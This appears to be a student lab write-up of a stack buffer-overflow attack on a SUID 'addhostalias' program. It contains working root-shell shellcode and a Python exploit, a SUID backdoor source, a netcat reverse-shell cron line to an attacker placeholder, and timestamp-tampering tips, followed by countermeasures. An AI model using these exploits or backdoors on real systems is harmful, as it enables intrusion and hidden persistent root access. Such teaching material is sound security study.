# Language-based Security

## Lab 2 - Buffer Overrun

### Part 1 : Gaining root access

#### How does it work ?

In order to gain root access to this machine, we are going to use the `addhostalias` executable file, which seems to be vulnerable to buffer overruns. In order to exploit this, we are going to go through several steps :
- Analyse the vulnerability in the code.
- Use gdb to analyse how the program behaves according to the arguments that we give.
- Find a way to exploit it. In our case, we will use Python which allows us to have our root shell more easily. Since it is a high-level language, we can focus on the content of our malicious code instead of how to generate it.

First of all, let's see the content of the `addhostalias` program. We have to run it by giving three arguments: IP address, host and alias. The program will load these values into a buffer, and store a new line into the hosts file, located in the /etc folder.

```c

#include <stdio.h>
#include <stdlib.h>
 
 
#define HOSTNAMELEN 256
#define IPADDR      1
#define HOSTNAME    2
#define ALIAS       3
 
#define HOSTFILE "/etc/hosts"
 
 
void add_alias(char *ip, char *hostname, char *alias) {
  char formatbuffer[256];
  FILE *file;
 
  sprintf(formatbuffer, "%s\t%s\t%s\n", ip, hostname, alias); // sprintf doesn't check if formatbuffer variable can be bound into 256 bytes, we are going to exploit this section
 
  file = fopen(HOSTFILE, "a");
  if (file == NULL) {
    perror("fopen");
    exit(EXIT_FAILURE);
  }
 
  fprintf(file, formatbuffer);
  if (fclose(file) != 0) {
    perror("close");
    exit(EXIT_FAILURE);
  }
}
 
 
int main(int argc, char *argv[]) {
  if (argc != 4) {
    printf("Usage: %s ipaddress hostname alias \n", argv[0]);
    exit(EXIT_FAILURE);
  }
 
  add_alias(argv[IPADDR], argv[HOSTNAME], argv[ALIAS]);
  return(0);
}

```

Here, we are going to exploit the `sprintf()` function which, in our case, fills the buffer with these three arguments and a space - the \t character - between each string. The problem is that this function doesn't check if the size of the final string is inferior or equal to the maximum length of our variable (formatbuffer in the program above). In the end, every string can be put in this variable, even if we define a size of 256 bytes during the allocation.
With this behavior, we can combine this `sprintf()` function property with adequate parameters, in order to fill the machine memory with malicious code. This is what is called a buffer overflow, which is based on the memory managment of computers. 
To better understand what will happen next, let us have a brief explanation of how the stack works in this type of program. In order to maintain consistency during the program execution, the OS stores everything that is necessary for the program to work in memory. This means it can push data in a stack, but also store addresses which point to other memory locations (for example when a function call is performed). The schema below shows a simplified view of memory layout:

```
       0xffffffff

   4 bytes (32bits OS)
< --------------------->


 ----------------------
|   RETURN ADDRESS      | 
 ----------------------
|    BASE POINTER      |
 ---------------------- 
|                      |
|                      |
|                      |
|                      |
|                      |
|       BUFFER         |
|    (256 bytes)       |
|                      |
|                      |
|                      |
 ----------------------

       0x00000000

```

During the execution of a program, the OS uses variables or parameters which will be stored into the stack (that grows downwards) ; it also uses return addresses to know where to go in memory and continue the execution and also some pointers. The most famous ones are EBP, which is base pointer and ESP, which is stack pointer.

In reality, memory management is more complicated, since it relies on some registers that store some more addresses into other registers in order for the program to run correctly. Memory also contains a heap that can be exploited, but these types of exploit are less common.

The last important point is that the SUID bit is set, so the program is vulnerable. When a user runs this program, his EUID (effective user id) becomes the same as root. This is necessary to have the possibility to edit the /etc/hosts file, where root only has the right to write to. In this case, The SUID bit is mandatory in order for `addhostalias` to work properly.


#### How did we create our exploit ?

To create our malicious input in an efficient way, we used GDB to see if everything was fine in memory management during the program execution:

- `gdb --args addhostalias <param1> <param2> <param3> ` entering debug mode for our program.
- `(gdb) break fopen` places a break point to stop the program execution when `fopen` function is called. In our case it will stop just after the buffer has been written to memory.
- `(gdb) run` runs the program until it finishes or when a breakpoint is reached.
- `(gdb) x/100x $sp` displays 100 current words in our memory where the stack pointer is located. This allows us to analyse the current stack state once our buffer is written with our three arguments.

On the figure below you can see these different steps executed as an example, and also the result in memory:

![How to use GDB to craft our exploit](assets/lab2/gdb-demo.png)

We now have to create an input that fulfills these requirements:
- size of 264 bytes, to fill perfectly into the current stack size (256B), plus the base pointer (32bits, so 4B) and the return address (4B for the same reason).
- at the beginning of the buffer is a series of NOP instructions, because in a computer memory layout, things tend to move slightly and you cannot ensure that your malicious code will permanently be located in a fixed address. It will create a sort of slope, that will redirect into the malicious code (since NOP instructions just tell the program to continue the execution into the next address in memory).
- malicious code, in our case, that spawns a shell as root user. The SUID bit configured on `addhostalias` gives us the opportunity to execute the commands described in the shellcode with the necessary root permissions. These instructions allow us to launch a root shell after the execution of the program. If we didn't set the real user id and the real group id as the effective user id (root) during the execution of the program, we would lose our root permissions before entering the called shell and have access to a normal user's shell instead.
- return address that returns to our series of NOP instructions.

The layout of the exploit thus will be:

```

 ----------------------
|   RETURN ADDRESS     | <------- now redirects approximately to the end of the stack (in the NOP slide inserted inside the buffer)
 ----------------------
|    BASE POINTER      | <------- not important in our case, but it is now overwritten with NOPs
 ---------------------- 
|                      |
|       MALICIOUS      |
|         CODE         |
|                      |
|         ...          |
|         NOP          |
|         NOP          |
|         NOP          |
 ----------------------

```

At the end, the final python code is:

```python
# run a shell on local machine
shellcode = ('\xb9\xff\xff\xff\xff\x31\xc0\xb0\x31\xcd\x80'
             +'\x89\xc3\x31\xc0\xb0\x46\xcd\x80\x31\xc0\xb0'
             +'\x32\xcd\x80\x89\xc3\xb0\x31\xb0\x47\xcd\x80'
             +'\x31\xc0\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68'
             +'\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xb0'
             +'\x0b\xcd\x80\x31\xc0\x40\xcd\x80\x90\x90\x90'
             +'\x90\x90\x90\x90\x90\x90\x90\x90\x90')


# NOP signal, tells the CPU to go to the next instruction
nop = '\x90'
nops = nop*181

# estimated area of the end of the stack
nop_adress = '\x10\xf9\xff\xbf'

# 181 (NOPs) + 75 (Shellcode) + 2 (separators between addhostalias arguments) + 2 (last 2 bytes for base pointer occupied by 2 NOPs)+ 4 (return address) = 264 bytes of data (instead of 256, so it will overwrite the base pointer and the return address)
print nops+shellcode,nop*2,nop_adress
```

The most important parts of the shellcode are the following:
- "\x31\xc0", sets real user id from effective user id. In other words, it means that after the execution, you will be permanently logged as root user (because your real user id becomes root) and not only during the program execution (using the SUID bit on the program rights). An example of C code doing this manipulation would be the code above:

```c

setuid(geteuid()); //takes current effective user ID (root because SUID bit is active) and update our real user ID with this value

```
Links of setuid and geteuid functions [here](http://man7.org/linux/man-pages/man2/setuid.2.html) and [here](http://manpagesfr.free.fr/man/man2/getuid.2.html)

- "\xb0\x47", sets real group id from effective user id. It also sets our real group id as root to get fully access to all the privileges of the root user (like files writable only by root group for example). The C functions are quite similar than the previous ones. 
- "\x89\xc3", which copies the value to ebx, which is a well-known CPU register. In this shellcode, the value that is stored is a pointer to `/bin/sh`, that thus will be executed as root because we own its user ID


Let's run the program in GDB and see what happens:

![Steps of our buffer overflow](assets/lab2/buffer-overflow.png)

We succeeded in putting our malicious code in memory and successfully overwritten the return address so that the program will point to the NOP slope.

Now we just have to run it, and we have a root shell !

![Gaining root shell using our exploit](assets/lab2/root-shell.png)


### Part 2 : Create a Backdoor

Once we have access to a root shell, we need to create a backdoor in order to be able to log as root easily the next time we need to.
To do that, all we need is to create a c file called `backdoor.c`for example:

```c 
#include<stdlib.h>
main () {
setuid(0);
system("/bin/bash");
}
```

Then we need to compile it with gcc: `gcc -o backdoor backdoor.c`.
Finally, we have to set the suid bit: `chmod u+s backdoor` and verify that group and others have the execute permission.

Now, when we execute`./backdoor` with the user dvader, we gain access to a root shell.

We could also use more hidden methods:
- add our ssh public key in the list of authorized keys, the root admin could eventually see that it appeared (more difficult if we edit the last modification timestamp using `touch -t YYYYMMDDhhmm <file>`).
- using a cron job that periodically run a reverse shell using netcat `nc -e /bin/bash <ATTACKER_IP> <PORT>`. Netcat is not installed on this machine so this exploit would be more suited for Debian or Ubuntu systems which are more common nowadays.
- using a rootkit, which is much more discrete when it comes to regaining access. Rootkit exploits can be harder to detect than previous explained methods.

### Part 3 : Countermeasures

#### Language

- Use secure library functions: 
The first thing that we could do to prevent such buffer overflow from happening is to use more secure functions to write into the buffer. 
The function `snprintf()` could be used here to replace `sprintf()` because its advantage is that you can specify, in the arguments, the maximum number of bytes to be written inside the buffer. In comparison, the `sprintf` function doesn't check the size of the input at all and stores everything, even if it is larger than the size of the buffer.
We could write: `snprintf(formatbuffer, 256, "%s\t%s\t%s\n", ip, hostname, alias);` and the content of the buffer would never go past 256 bytes, preventing a buffer overflow attack.


#### Run-time

- Canaries:
A canary is a local variable added on the stack during the prologue of the function which serves as an indication, in the epilogue, to see if a buffer overflow occured. This canary is placed between the buffer and the return address and if its initial value is altered during the execution of the function, the program will crash.
It is used to detect that a memory overwrite happened during run-time because if the return address has been modified, then this value placed between the buffer and the return address must also have been modified.
In our `add_alias` function, before the creation of the buffer, we could add:

```c
void add_alias(char *ip, char *hostname, char *alias) {
  long canary = canary_value;
  char formatbuffer[256];
  FILE *file;
```

and after the `sprintf()` function call, we can simply add:

```c
sprintf(formatbuffer, "%s\t%s\t%s\n", ip, hostname, alias);
if (canary != canary_value){
	exit(error_code);
}
```

Another layer of security to make it harder for the attacker to guess the canary's value and overwrite it with the same value could be to add randomly generated canaries at each execution of the program for exemple. 
We could also add a "\0" character in the middle of the canary value.
Nevertheless, usually this countermeasure is a feature offered by compilers which allows to automaticaly set a canary value. 
This feature prevents programmers from having to write more lines of code to implement a canary defense mechanism, like in the exemple above. On gcc, we can set the flag `-fstack-protector` when compiling the code.

- Use dynamic analysis tools:
We could possibly use some tools that try debugging the code with run-time checks like ValGrind, Purify, AddressSanitizer, etc.

- Use the libsafe library:
The libsafe library allows to intercept and monitor all function calls to unsafe functions that could potentially be used to execute buffer overflow attacks like `gets()` and `sprintf()` in a program.
At run-time, once a buffer has been initialized, it detects automatically an upper limit to the value's size that can be added inside the buffer and creates a substitute version of the function that executes the original function's purpose, but in a safe way (the buffer overflow is contained in the stack frame).

The only thing needed to use libsafe on our program is to install it and set the `LD_PRELOAD` environment variable to point to the libsafe library:

```
LD_PRELOAD=/lib/libsafe.so.2
export LD_PRELOAD
```

Then, without needing to add any special line of code to our program, it will be automatically checked by the libsafe library when we run it.

#### Operating system

- NX bit/DEP/WoX :
Used to prevent the shellcode from being executed by storing it in a memory location reserved to write data and not execute it (marks the stack as non-executable). 
For this to happen, the program counter must redirect to the text/code segment of the stack and not the data segment or above to prevent execution of malicious code.

To set the NX-bit in our program to make the stack non-executable, we can set the flag `-z noexecstack` while compiling with gcc.

- ASLR :
ASLR is used to randomise the memory locations of certain elements on the stack, system functions locations, shared library locations, etc. 
This makes it a lot harder for an attacker to guess the memory address to return to in order to execute his shellcode for exemple.

Normally, a recent kernel automatically randomize these memory layout addresses, but if it is not the case for our program, we can manually set the randomization with the command:
`# echo 1 > /proc/sys/kernel/randomize_va_space`
We could also echo 2 to randomize more addresses.


All these counter measures should normally prevent or at least make the vast majority of buffer overflow attacks harder to execute for the malicious individuals.


### Sources that helped us to gain root access on the machine

1. [Buffer Overflow Attack, Computerphile](https://www.youtube.com/watch?v=1S0aBV-Waeo&t=589s)
2. [GDB Petit Tutoriel, Daniel Hirschkof](http://perso.ens-lyon.fr/daniel.hirschkoff/C_Caml/docs/doc_gdb.pdf)
3. [Le Débogueur GDB, Anne Canteaut](https://www.rocq.inria.fr/secret/Anne.Canteaut/COURS_C/gdb.html)

### Sources for the countermeasures' discussion

1. [Attacking the stack (continued), Erik Poll and Peter Schwabe](https://www.cs.ru.nl/E.Poll/hacking/slides/hic6.pdf)
2. [Manpages libsafe, splitbrain.org](https://man.cx/libsafe(8))
3. [Hackers Hut, Andries Brouwer](https://www.win.tue.nl/~aeb/linux/hh/protection.html)






